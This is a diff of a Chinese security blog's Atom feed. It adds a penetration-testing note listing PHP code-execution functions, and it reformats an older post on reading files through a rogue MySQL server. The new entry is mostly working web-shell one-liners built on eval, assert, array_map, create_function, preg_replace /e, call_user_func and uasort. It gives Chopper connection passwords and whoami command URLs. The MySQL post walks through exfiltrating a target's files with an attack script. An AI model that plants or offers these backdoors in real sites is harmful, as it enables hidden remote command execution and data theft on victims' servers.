@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ygnight.xyz/"/>
-  <updated>2019-12-18T08:19:01.665Z</updated>
+  <updated>2020-01-17T02:27:23.275Z</updated>
   <id>http://ygnight.xyz/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP代码执行函数</title>
+    <link href="http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
+    <id>http://ygnight.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</id>
+    <published>2020-01-13T08:20:20.808Z</published>
+    <updated>2020-01-17T02:27:23.275Z</updated>
+    
+    <content type="html"><![CDATA[<p>1、eval()函数</p><pre><code>1.#eval() 函数把字符串按照 PHP 代码来计算2.#常见一句话：3.&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><p>2、assert()函数</p><pre><code>1.#与eval类似2.#常见一句话3.&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><p>3、array_map()函数</p><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。#命令执行http://localhost/123.php?func=system   cmd=whoami#菜刀连接http://localhost/123.php?func=assert   密码：cmd$func=$_GET[&apos;func&apos;];$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);echo $new_array;</code></pre><p>4、create_function()函数</p><pre><code>#创建匿名函数#执行命令和上传文件参考eval函数(必须加分号)。#菜刀连接密码：cmd$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();</code></pre><p>5、preg_replace()函数</p><pre><code>#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;)#执行命令和上传文件参考assert函数(不需要加分号)。#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code></pre><p>6、call_user_func()函数</p><pre><code>#传入的参数作为assert函数的参数#cmd=system(whoami)#菜刀连接密码：cmdcall_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);</code></pre><p>7、call_user_func_array()函数</p><pre><code>#将传入的参数作为数组的第一个值传递给assert函数#cmd=system(whoami)#菜刀连接密码：cmd$cmd=$_POST[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);</code></pre><p>8、array_filter()函数</p><pre><code>#用回调函数过滤数组中的元素：array_filter(数组,函数)#命令执行func=system&amp;cmd=whoami#菜刀连接http://localhost/123.php?func=assert  密码cmd$cmd=$_POST[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);</code></pre><p>9、uasort()函数</p><pre><code>#php环境&gt;=&lt;5.6才能用#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmdusort($_GET,&apos;asse&apos;.&apos;rt&apos;);</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1、eval()函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1.#eval() 函数把字符串按照 PHP 代码来计算
+2.#常见一句话：
+3.&amp;lt;?php @eval($_POST[&amp;apos;YGnight&amp;apos;]);?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、ass
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://ygnight.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="笔记" scheme="http://ygnight.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>使用drony解决Flutter框架导致APP无法抓包情况</title>
@@ -48,9 +77,9 @@
     <link href="http://ygnight.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
     <id>http://ygnight.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
     <published>2019-12-13T09:40:29.302Z</published>
-    <updated>2019-12-16T07:10:50.373Z</updated>
+    <updated>2020-01-13T08:25:16.163Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p><h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><p>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql</p><p>2.注入高权限，可–os-shell （可以上传另说，出现上传失败的情况可以利用）</p><p>3.。。。。。其他情况</p><hr><h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><p>虚拟机两个，靶机装mysql，攻击端装py</p><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p><h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><p>exp_input.py脚本是输入文件，单独读取</p><p>启动</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure><p>读取的文件最后保存在log文件夹下</p><hr><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p><p>exp_input.py 3306</p><p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p><p><img src="0.png" alt="0"></p><p>靶机使用mysql向攻击端发送请求</p><p><img src="0-1.png" alt="0-1"></p><p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p><p><img src="1.png" alt="1"></p><p>此时返回攻击端，可以看到dos窗口回显了信息</p><p><img src="0-0.png" alt="0-0"></p><p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p><p><img src="0-2.png" alt="0-2"></p><p><img src="0-3.png" alt="0-3"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="研究情况："><a href="#研究情况：" class="headerlink" title="研究情况："></a>研究情况：</h2><p>  当遇到<strong>可控MYSQL</strong>时怎么进一步搞事情</p><h2 id="情景："><a href="#情景：" class="headerlink" title="情景："></a>情景：</h2><pre><code>1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用）3.。。。。。其他情况</code></pre><hr><h2 id="所需环境："><a href="#所需环境：" class="headerlink" title="所需环境："></a>所需环境：</h2><pre><code>虚拟机两个，靶机装mysql，攻击端装py</code></pre><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/YGnight/Mysqlist" target="_blank" rel="noopener">https://github.com/YGnight/Mysqlist</a></p><h2 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h2><pre><code>exp_input.py脚本是输入文件，单独读取启动<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp_input.py<span class="built_in"> port </span> （port为端口号，3306都可）</span><br></pre></td></tr></table></figure>读取的文件最后保存在log文件夹下</code></pre><hr><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>攻击端运行攻击脚本，</p><p>exp_input.py 3306</p><p>输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini</p><p><img src="0.png" alt="0"></p><p>靶机使用mysql向攻击端发送请求</p><p><img src="0-1.png" alt="0-1"></p><p>password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记）</p><p><img src="1.png" alt="1"></p><p>此时返回攻击端，可以看到dos窗口回显了信息</p><p><img src="0-0.png" alt="0-0"></p><p>查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件</p><p><img src="0-2.png" alt="0-2"></p><p><img src="0-3.png" alt="0-3"></p>]]></content>
     
     <summary type="html">
     
